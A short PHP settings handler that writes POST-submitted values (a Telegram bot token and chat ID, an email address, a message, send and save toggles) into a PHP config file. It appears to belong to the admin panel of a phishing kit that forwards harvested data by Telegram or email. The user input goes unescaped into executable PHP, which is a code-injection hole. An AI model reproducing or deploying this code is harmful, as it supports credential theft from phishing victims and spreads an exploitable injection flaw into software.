<?php
error_reporting(0);
session_start();
if(!(isset($_SESSION["login"]))){
	exit();
	header("Location: panel");
}
if($_POST["telegram_option"] == "on"){
	$telegram_send = "true";
}
else {
	$telegram_send = "false";
}

if($_POST["email_option"] == "on"){
	$email_send = "true";
}
else {
	$email_send = "false";
}


if($_POST["message_option"] == "on"){
	$message_option = "true";
}
else {
	$message_option = "false";
}

if($_POST["data_option"] == "on"){
	$save_file = "true";
}
else {
	$save_file = "false";
}

$config = '<?php $telegram_send='.$telegram_send.';$bottoken="'.$_POST["token"].'";$chatid="'.$_POST["chatid"].'";$email_send='.$email_send.';$email="'.$_POST["email"].'";$message="'.$_POST["message"].'";$message_option='.$message_option.';$save_file='.$save_file.';?>';

$file = fopen("../assets/c.php", "w+");
fwrite($file, $config);
fclose($file);
header("Location: dashboard.php");
?>
